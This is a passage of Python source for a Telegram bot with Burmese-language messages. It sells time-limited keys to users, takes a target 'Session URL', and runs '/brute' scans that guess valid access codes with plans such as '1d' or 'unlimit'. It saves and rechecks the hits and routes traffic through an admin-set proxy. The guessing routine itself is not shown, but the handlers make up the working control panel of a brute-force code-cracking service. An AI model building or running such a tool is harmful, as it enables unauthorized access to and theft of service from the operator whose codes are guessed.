            if plan == "N/A" or plan == "":
                plan = "1d"
            lines.append(f"`{i['code']}` - {plan}")
        await bot.send_message(chat_id, f"ပြန်စစ်ပြီး: {len(new_success)} ခု မှန်ကန်\n" + "\n".join(lines), parse_mode="Markdown")
    else:
        success_texts[chat_id] = []
        await bot.send_message(chat_id, "မှန်ကန်သော code မရှိတော့ပါ။")

# ── Verify Key button ────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "btn_key")
async def cb_key(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    await _verify_key(chat_id)

# ── Setup Session URL button ─────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "btn_setup")
async def cb_setup(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if not approve.get(chat_id, False):
        await bot.send_message(chat_id, "Key အရင်အတည်ပြုပါ။ 🔑 Key အတည်ပြုရန် ခလုတ်ကိုနှိပ်ပါ။")
        return
    waiting_for[chat_id] = "setup_url"
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("ပယ်ဖျက်ရန်", callback_data="btn_cancel"))
    await bot.send_message(chat_id, "Session URL ကို ပို့ပါ:", reply_markup=markup)

# ── Scan Code menu button ────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "btn_scan_menu")
async def cb_scan_menu(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    await _show_scan_menu(chat_id)

# ── Scan mode selected ───────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("scan_mode_"))
async def cb_scan_mode(call):
    chat_id = call.message.chat.id
    mode = call.data.replace("scan_mode_", "")
    await bot.answer_callback_query(call.id)
    brute_temp[chat_id] = {"mode": mode, "target": None, "plan_filters": []}

    markup = InlineKeyboardMarkup(row_width=3)
    markup.add(
        InlineKeyboardButton("5", callback_data="scan_target_5"),
        InlineKeyboardButton("10", callback_data="scan_target_10"),
        InlineKeyboardButton("20", callback_data="scan_target_20"),
    )
    markup.add(
        InlineKeyboardButton("50", callback_data="scan_target_50"),
        InlineKeyboardButton("100", callback_data="scan_target_100"),
        InlineKeyboardButton("ကန့်သတ်မရှိ", callback_data="scan_target_none"),
    )
    markup.add(InlineKeyboardButton("စိတ်ကြိုက်ထည့်ရန်", callback_data="scan_target_custom"))
    markup.add(InlineKeyboardButton("နောက်သို့", callback_data="btn_scan_menu"))
    await bot.edit_message_text(f"Mode: **{mode}**\nTarget ရွေးပါ:", chat_id=chat_id,
                                message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)

# ── Scan target selected ─────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("scan_target_"))
async def cb_scan_target(call):
    chat_id = call.message.chat.id
    val = call.data.replace("scan_target_", "")
    await bot.answer_callback_query(call.id)

    if chat_id not in brute_temp:
        await bot.send_message(chat_id, "Session ကုန်သွားပါပြီ။ အစကနေ ပြန်စပါ။")
        return

    if val == "custom":
        waiting_for[chat_id] = "brute_target"
        await bot.edit_message_text("Target အရေအတွက် ထည့်ပါ:", chat_id=chat_id, message_id=call.message.message_id)
        return

    brute_temp[chat_id]["target"] = None if val == "none" else int(val)
    await _show_plan_filter(chat_id, call.message.message_id)

# ── Scan plan filter selected ─────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("scan_plan_"))
async def cb_scan_plan(call):
    chat_id = call.message.chat.id
    val = call.data.replace("scan_plan_", "")
    await bot.answer_callback_query(call.id)

    if chat_id not in brute_temp:
        await bot.send_message(chat_id, "Session ကုန်သွားပါပြီ။ အစကနေ ပြန်စပါ။")
        return

    if val == "custom":
        waiting_for[chat_id] = "brute_plan"
        await bot.edit_message_text("Plan filter ထည့်ပါ (ဥပမာ: 1d, 2h, unlimit):", chat_id=chat_id, message_id=call.message.message_id)
        return

    if val != "skip":
        brute_temp[chat_id]["plan_filters"] = [val]

    params = brute_temp.pop(chat_id)
    await bot.edit_message_text("Scan စတင်နေပါသည်...", chat_id=chat_id, message_id=call.message.message_id)
    await start_brute_scan(chat_id, params["mode"], params["target"], call.message, plan_filters=params["plan_filters"])

# ── Stop scan button ─────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "btn_stop")
async def cb_stop(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        await bot.edit_message_text("Scan ရပ်ထားပါသည်။ /resume ဖြင့် ပြန်စနိုင်ပါသည်။", chat_id=chat_id, message_id=call.message.message_id)
    else:
        await bot.edit_message_text("ရပ်ရန် scan မရှိပါ။", chat_id=chat_id, message_id=call.message.message_id)

# ── Resume scan button ───────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "btn_resume")
async def cb_resume(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if chat_id not in last_scan_params:
        await bot.send_message(chat_id, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ...", chat_id=chat_id, message_id=call.message.message_id)
    await start_brute_scan(chat_id, params['mode'], params['target'], call.message, plan_filters=params.get('plan_filters', []))

# ── Saved codes button ───────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "btn_saved")
async def cb_saved(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    await _show_saved(chat_id)

# ── Notify toggle button ─────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "btn_notify")
async def cb_notify(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    await _toggle_notify(chat_id)

# ── Recheck button ───────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "btn_recheck")
async def cb_recheck(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    await _recheck_codes(chat_id, call.message)

# ── Cancel button ────────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "btn_cancel")
async def cb_cancel(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    waiting_for.pop(chat_id, None)
    brute_temp.pop(chat_id, None)
    admin_genkey_temp.pop(chat_id, None)
    await bot.edit_message_text("ပယ်ဖျက်ပြီးပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)

# ── Back to start button ─────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "btn_back_start")
async def cb_back_start(call):
    await bot.answer_callback_query(call.id)
    await bot.delete_message(call.message.chat.id, call.message.message_id)
    await cmd_start(call.message)

# ══════════════════════════════════════════════════════════════════════════
# ── ADMIN PANEL ──────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════

@bot.callback_query_handler(func=lambda c: c.data == "btn_admin")
async def cb_admin_panel(call):
    chat_id = call.message.chat.id
    if str(chat_id) != ADMIN_ID:
        await bot.answer_callback_query(call.id, "No Permission")
        return
    await bot.answer_callback_query(call.id)

    active_scans = sum(1 for d in scan_tasks.values() if not d["task"].done())
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    proxy_status = "ON" if proxy_settings["enabled"] else "OFF"

    text = (
        f"**Admin Panel**\n\n"
        f"Uptime: {hours}h {minutes}m {seconds}s\n"
        f"လုပ်ဆောင်နေသော Scan: {active_scans}\n"
        f"အတည်ပြုပြီး User: {approved_users}\n"
        f"Session: {len(user_data)}\n"
        f"Proxy: {proxy_status}\n"
    )

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("Key ထုတ်ရန်", callback_data="admin_genkey"),
        InlineKeyboardButton("Key ဖျက်ရန်", callback_data="admin_delkey"),
    )
    markup.add(
        InlineKeyboardButton("Key များကြည့်ရန်", callback_data="admin_listkeys"),
        InlineKeyboardButton("Bot အခြေအနေ", callback_data="admin_status"),
    )
    proxy_btn_text = "Proxy: ပိတ် → ဖွင့်" if not proxy_settings["enabled"] else "Proxy: ဖွင့် → ပိတ်"
    markup.add(InlineKeyboardButton(proxy_btn_text, callback_data="admin_proxy_toggle"))
    markup.add(InlineKeyboardButton("Proxy URL သတ်မှတ်ရန်", callback_data="admin_proxy_url"))
    markup.add(InlineKeyboardButton("နောက်သို့", callback_data="btn_back_start"))

    await bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id,
                                parse_mode="Markdown", reply_markup=markup)

# ── Admin: Gen Key ───────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "admin_genkey")
async def cb_admin_genkey(call):
    chat_id = call.message.chat.id
    if str(chat_id) != ADMIN_ID:
        await bot.answer_callback_query(call.id, "No Permission")
        return
    await bot.answer_callback_query(call.id)
    waiting_for[chat_id] = "genkey_duration"
    admin_genkey_temp[chat_id] = {}
    markup = InlineKeyboardMarkup(row_width=3)
    markup.add(
        InlineKeyboardButton("1h", callback_data="gk_dur_1h"),
        InlineKeyboardButton("1d", callback_data="gk_dur_1d"),
        InlineKeyboardButton("7d", callback_data="gk_dur_7d"),
    )
    markup.add(
        InlineKeyboardButton("30d", callback_data="gk_dur_30d"),
        InlineKeyboardButton("Unlimited", callback_data="gk_dur_unlimited"),
    )
    markup.add(InlineKeyboardButton("စိတ်ကြိုက်ထည့်ရန်", callback_data="gk_dur_custom"))
    markup.add(InlineKeyboardButton("ပယ်ဖျက်ရန်", callback_data="btn_cancel"))
    await bot.edit_message_text("သက်တမ်း ရွေးပါ:", chat_id=chat_id,
                                message_id=call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("gk_dur_"))
async def cb_gk_duration(call):
    chat_id = call.message.chat.id
    val = call.data.replace("gk_dur_", "")
    await bot.answer_callback_query(call.id)

    if val == "custom":
        waiting_for[chat_id] = "genkey_duration"
        await bot.edit_message_text("သက်တမ်း ထည့်ပါ (ဥပမာ: 1h30m, 2d, unlimited):", chat_id=chat_id, message_id=call.message.message_id)
        return

    admin_genkey_temp[chat_id] = {"duration": val}
    waiting_for[chat_id] = "genkey_userid"
    await bot.edit_message_text(f"သက်တမ်း: **{val}**\nUser ID ထည့်ပါ:", chat_id=chat_id,
                                message_id=call.message.message_id, parse_mode="Markdown")

# ── Admin: Del Key ───────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "admin_delkey")
async def cb_admin_delkey(call):
    chat_id = call.message.chat.id
    if str(chat_id) != ADMIN_ID:
        await bot.answer_callback_query(call.id, "No Permission")
        return
    await bot.answer_callback_query(call.id)
    waiting_for[chat_id] = "delkey_userid"
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("ပယ်ဖျက်ရန်", callback_data="btn_cancel"))
    await bot.edit_message_text("Key ဖျက်ရန်: User ID ထည့်ပါ:", chat_id=chat_id,
                                message_id=call.message.message_id, reply_markup=markup)

# ── Admin: List Keys ─────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "admin_listkeys")
async def cb_admin_listkeys(call):
    chat_id = call.message.chat.id
    if str(chat_id) != ADMIN_ID:
        await bot.answer_callback_query(call.id, "No Permission")
        return
    await bot.answer_callback_query(call.id)
    auth_list = load_auth()
    if not auth_list:
        await bot.send_message(chat_id, "စာရင်းသွင်းထားသော key မရှိသေးပါ။")
        return
    lines = []
    for uid, data in auth_list.items():
        if isinstance(data, dict):
            expires = data.get("expires_at", "unknown")
            plan = data.get("plan", "unknown")
            if expires == "9999-12-31T23:59:59Z":
                expires_str = "Unlimited"
            else:
                try:
                    exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                    now = datetime.now(timezone.utc)
                    if exp_dt < now:
                        expires_str = "Expired"
                    else:
                        diff = exp_dt - now
                        days = diff.days
                        hours, rem = divmod(diff.seconds, 3600)
                        minutes = rem // 60
                        expires_str = f"{days}d {hours}h {minutes}m left"
                except:
                    expires_str = expires
        else:
            plan = "old"
            expires_str = str(data)
        lines.append(f"`{uid}` | {plan} | {expires_str}")
    text = f"**စာရင်းသွင်းထားသော Key ({len(auth_list)})**\n\n" + "\n".join(lines)
    await send_chunks(chat_id, text, parse_mode="Markdown")

# ── Admin: Status ────────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "admin_status")
async def cb_admin_status(call):
    chat_id = call.message.chat.id
    if str(chat_id) != ADMIN_ID:
        await bot.answer_callback_query(call.id, "No Permission")
        return
    await bot.answer_callback_query(call.id)
    active_scans = sum(1 for d in scan_tasks.values() if not d["task"].done())
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    proxy_status = f"ON ({proxy_settings['url']})" if proxy_settings["enabled"] else "OFF"
    text = (
        f"**Bot အခြေအနေ**\n\n"
        f"Uptime: {hours}h {minutes}m {seconds}s\n"
        f"လုပ်ဆောင်နေသော Scan: {active_scans}\n"
        f"အတည်ပြုပြီး User: {approved_users}\n"
        f"Session: {len(user_data)}\n"
        f"Proxy: {proxy_status}"
    )
    await bot.send_message(chat_id, text, parse_mode="Markdown")

# ── Admin: Proxy toggle ──────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "admin_proxy_toggle")
async def cb_admin_proxy_toggle(call):
    chat_id = call.message.chat.id
    if str(chat_id) != ADMIN_ID:
        await bot.answer_callback_query(call.id, "No Permission")
        return
    await bot.answer_callback_query(call.id)
    proxy_settings["enabled"] = not proxy_settings["enabled"]
    save_proxy()
    state = "ON" if proxy_settings["enabled"] else "OFF"
    url_info = f" ({proxy_settings['url']})" if proxy_settings["url"] else " (URL မသတ်မှတ်ရသေး)"
    await bot.send_message(chat_id, f"Proxy: {state}{url_info}")
    await cb_admin_panel(call)

# ── Admin: Set Proxy URL ─────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "admin_proxy_url")
async def cb_admin_proxy_url(call):
    chat_id = call.message.chat.id
    if str(chat_id) != ADMIN_ID:
        await bot.answer_callback_query(call.id, "No Permission")
        return
    await bot.answer_callback_query(call.id)
    waiting_for[chat_id] = "proxy_url"
    current = proxy_settings.get("url", "မရှိ")
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("ပယ်ဖျက်ရန်", callback_data="btn_cancel"))
    await bot.send_message(chat_id, f"လက်ရှိ proxy: `{current}`\n\nProxy URL ထည့်ပါ (ဥပမာ: http://user:pass@ip:port):",
                           parse_mode="Markdown", reply_markup=markup)

# ══════════════════════════════════════════════════════════════════════════
# ── TEXT INPUT HANDLER ────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════

@bot.message_handler(func=lambda m: m.chat.id in waiting_for)
async def handle_waiting_input(message):
    chat_id = message.chat.id
    state = waiting_for.pop(chat_id, None)
    text = message.text.strip() if message.text else ""

    if state == "setup_url":
        if await check_session_url(text):
            if chat_id in scan_tasks:
                task_info = scan_tasks.pop(chat_id, None)
                if task_info and task_info.get("task"):
                    task_info["task"].cancel()
            user_data.setdefault(chat_id, {})
            user_data[chat_id]['session_url'] = text
            success_texts.pop(chat_id, None)
            limited_texts.pop(chat_id, None)
            last_scan_params.pop(chat_id, None)
            pending_brute.pop(chat_id, None)
            success_messages.pop(chat_id, None)
            limited_messages.pop(chat_id, None)
            notify_state.pop(chat_id, None)
            save_state()
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔍 Code ရှာရန်", callback_data="btn_scan_menu"))
            await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။", reply_markup=markup)
        else:
            await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည်။ ပြန်ကြိုးစားပါ။")

    elif state == "genkey_duration":
        admin_genkey_temp[chat_id] = {"duration": text}
        waiting_for[chat_id] = "genkey_userid"
        await bot.reply_to(message, f"သက်တမ်း: {text}\nUser ID ထည့်ပါ:")

    elif state == "genkey_userid":
        temp = admin_genkey_temp.pop(chat_id, {})
        duration = temp.get("duration", "")
        user_id = text
        expiry = generate_expiry(duration)
        if not expiry:
            await bot.reply_to(message, "သက်တမ်းပုံစံ မမှန်ပါ။")
            return
        auth_list = load_auth()
        auth_list[user_id] = {"expires_at": expiry, "plan": duration}
        save_auth(auth_list)
        await bot.reply_to(message, f"✅ Key ထုတ်ပြီး\n\nUser: {user_id}\nPlan: {duration}\nExpires: {expiry}")

    elif state == "delkey_userid":
        user_id = text
        auth_list = load_auth()
        if user_id not in auth_list:
            await bot.reply_to(message, f"User {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        save_auth(auth_list)
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(message, f"✅ User {user_id} အတွက် Key ဖျက်ပြီး။")

    elif state == "proxy_url":
        proxy_settings["url"] = text
        save_proxy()
        await bot.reply_to(message, f"Proxy URL သတ်မှတ်ပြီး: {text}")

    elif state == "brute_target":
        try:
            target = int(text)
            brute_temp[chat_id]["target"] = target
            await _show_plan_filter(chat_id, None)
        except ValueError:
            await bot.reply_to(message, "ဂဏန်းဖြစ်ရပါမည်။ Scan menu ကနေ ပြန်စပါ။")
            brute_temp.pop(chat_id, None)

    elif state == "brute_plan":
        if chat_id not in brute_temp:
            await bot.reply_to(message, "Session ကုန်သွားပါပြီ။")
            return
        brute_temp[chat_id]["plan_filters"] = [text]
        params = brute_temp.pop(chat_id)
        await bot.reply_to(message, "Scan စတင်နေပါသည်...")
        await start_brute_scan(chat_id, params["mode"], params["target"], message, plan_filters=params["plan_filters"])

# ══════════════════════════════════════════════════════════════════════════
# ── LEGACY COMMANDS ──────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command လမ်းညွှန်**\n\n"
        "/start - Menu ဖွင့်ရန်\n"
        "/help - အသုံးပြုနည်း ကြည့်ရန်\n"
        "/key - သင့် Key ကို အတည်ပြုရန်\n"
        "/setup [session_url] - Session URL သတ်မှတ်ရန်\n"
        "/brute <mode> [target] [plan] - Code စတင်ရှာဖွေရန်\n"
        "   /brute 6 10 1d        → ၁ရက် code ၁၀ ခုရှာ\n"
        "   /brute 6 1d unlimit  → ၁ရက်(သို့) unlimit code ရှာ\n"
        "   /brute 6             → အစုံရှာ\n"
        "/stop - ရှာဖွေနေသည့် လုပ်ငန်းစဉ်အားရပ်ရန်\n"
        "/resume - ရပ်ထားသည့် scan ကို ပြန်စရန်\n"
        "/saved - လက်ရှိ session success/limited codes ကြည့်ရန်\n"
        "/notify - code တွေ့တိုင်း အကြောင်းကြားချက် On/Off\n"
        "/recheck - သိမ်းထားသော success codes ပြန်လည်စစ်ဆေးရန်\n"
        "/status - (Admin) Bot အခြေအနေကြည့်ရန်\n"
        "/genkey <duration> <user_id> - (Admin) Key ထုတ်ပေးရန်\n"
        "   duration: 30m, 1h, 2d, 1h30m, unlimited\n"
        "/delkey <user_id> - (Admin) Key ဖျက်ရန်\n"
        "/listkeys - (Admin) Key များကြည့်ရန်"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    await _verify_key(message.chat.id)

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        waiting_for[message.chat.id] = "setup_url"
        await bot.reply_to(message, "Session URL ကို ပို့ပါ:")
        return
    url = args[1]
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "Key အရင်အတည်ပြုပါ။ /key ဖြင့် အတည်ပြုပါ။")
        return
    if await check_session_url(url):
        if chat_id in scan_tasks:
            task_info = scan_tasks.pop(chat_id, None)
            if task_info and task_info.get("task"):
                task_info["task"].cancel()
        user_data.setdefault(chat_id, {})
        user_data[chat_id]['session_url'] = url
        success_texts.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
        pending_brute.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        notify_state.pop(chat_id, None)
        save_state()
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔍 Code ရှာရန်", callback_data="btn_scan_menu"))
        await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။", reply_markup=markup)
    else:
        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['brute'])
async def handle_brute(message):
    args = message.text.split()
    if len(args) < 2:
        await _show_scan_menu(message.chat.id)
        return
    mode = args[1]
    target = None
    plan_filters = []
    idx = 2
    if idx < len(args) and not PLAN_RE.match(args[idx]):
        try:
            target = int(args[idx])
            idx += 1
        except:
            await bot.reply_to(message, "Target သည် ဂဏန်းဖြစ်ရပါမည်။")
            return
    for arg in args[idx:]:
        if PLAN_RE.match(arg):
            plan_filters.append(arg)
        else:
            await bot.reply_to(message, f"'{arg}' သည် plan ပုံစံမမှန်ပါ။")
            return
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "Key အရင်အတည်ပြုပါ။ /key ဖြင့် အတည်ပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Session URL အရင်ထည့်ပါ။ /setup ဖြင့် ထည့်ပါ။")
        return
    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("ပြန်စရန်", callback_data="resume_scan"),
            InlineKeyboardButton("Scan အသစ်", callback_data="new_scan")
        )
        pending_brute[chat_id] = {"mode": mode, "target": target, "plan_filters": plan_filters}
        prev = last_scan_params[chat_id]
        prev_plans = ' / '.join(prev.get('plan_filters') or []) or 'အားလုံး'
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, target: {prev['target']}, plan: {prev_plans})"
            f"\nပြန်စမလား၊ အသစ်စမလား?", reply_markup=markup)
        return
    await start_brute_scan(chat_id, mode, target, message, plan_filters=plan_filters)

@bot.message_handler(commands=['stop'])
async def handle_stop(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ ပြန်စလိုပါက /resume ကိုသုံးပါ။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def handle_resume(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params['target'], message, plan_filters=params.get('plan_filters', []))
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။", chat_id=chat_id, message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params['target'], call.message, plan_filters=params.get('plan_filters', []))
    else:
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id)
            last_scan_params.pop(chat_id, None)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params['target'], call.message, plan_filters=params.get('plan_filters', []))
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)

@bot.message_handler(commands=['saved'])
async def handle_saved(message):
    await _show_saved(message.chat.id)

@bot.message_handler(commands=['notify'])
async def handle_notify(message):
    await _toggle_notify(message.chat.id)

@bot.message_handler(commands=['recheck'])
async def handle_recheck(message):
    await _recheck_codes(message.chat.id, message)

@bot.message_handler(commands=['status'])
async def handle_status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "ခွင့်ပြုချက် မရှိပါ။")
        return
    active_scans = sum(1 for d in scan_tasks.values() if not d["task"].done())
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    proxy_status = f"ON ({proxy_settings['url']})" if proxy_settings["enabled"] else "OFF"
    text = (
        f"**Bot အခြေအနေ**\n\n"
        f"Uptime: {hours}h {minutes}m {seconds}s\n"
        f"လုပ်ဆောင်နေသော Scan: {active_scans}\n"
        f"အတည်ပြုပြီး User: {approved_users}\n"
        f"Session: {len(user_data)}\n"
        f"Proxy: {proxy_status}"
    )
    await bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['genkey'])
async def handle_genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "ခွင့်ပြုချက် မရှိပါ။")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/genkey 1h30m 123456789\n/genkey unlimited 123456789")
        return
    plan = args[1]
    user_id = args[2]
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "သက်တမ်းပုံစံ မမှန်ပါ။")
        return
    auth_list = load_auth()
    auth_list[user_id] = {"expires_at": expiry, "plan": plan}
    save_auth(auth_list)
    await bot.reply_to(message, f"✅ Key ထုတ်ပြီး\n\nUser: {user_id}\nPlan: {plan}\nExpires: {expiry}")

@bot.message_handler(commands=['delkey'])
async def handle_delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "ခွင့်ပြုချက် မရှိပါ။")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/delkey 123456789")
        return
    user_id = args[1]
    auth_list = load_auth()
    if user_id not in auth_list:
        await bot.reply_to(message, f"User {user_id} မတွေ့ပါ။")
        return
    del auth_list[user_id]
    save_auth(auth_list)
    approve.pop(int(user_id), None)
    user_data.pop(int(user_id), None)
    await bot.reply_to(message, f"✅ User {user_id} အတွက် Key ဖျက်ပြီး။")

@bot.message_handler(commands=['listkeys'])
async def handle_listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "ခွင့်ပြုချက် မရှိပါ။")
        return
    auth_list = load_auth()
    if not auth_list:
        await bot.reply_to(message, "စာရင်းသွင်းထားသော key မရှိသေးပါ။")
        return
    lines = []
    for uid, data in auth_list.items():
        if isinstance(data, dict):
            expires = data.get("expires_at", "unknown")
            plan = data.get("plan", "unknown")
            if expires == "9999-12-31T23:59:59Z":
                expires_str = "Unlimited"
            else:
                try:
                    exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                    now = datetime.now(timezone.utc)
                    if exp_dt < now:
                        expires_str = "Expired"
                    else:
                        diff = exp_dt - now
                        days = diff.days
                        hours, rem = divmod(diff.seconds, 3600)
                        minutes = rem // 60
                        expires_str = f"{days}d {hours}h {minutes}m left"
                except:
                    expires_str = expires
        else:
            plan = "old"
            expires_str = str(data)
        lines.append(f"`{uid}` | {plan} | {expires_str}")
    text = f"**စာရင်းသွင်းထားသော Key ({len(auth_list)})**\n\n" + "\n".join(lines)
    await send_chunks(message.chat.id, text, parse_mode="Markdown", reply_to_message_id=message.message_id)

# ══════════════════════════════════════════════════════════════════════════
# ── POLLING AND MAIN ─────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except Exception as e:
            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=True)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        load_state()
        load_proxy()
        await load_saved_results()
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
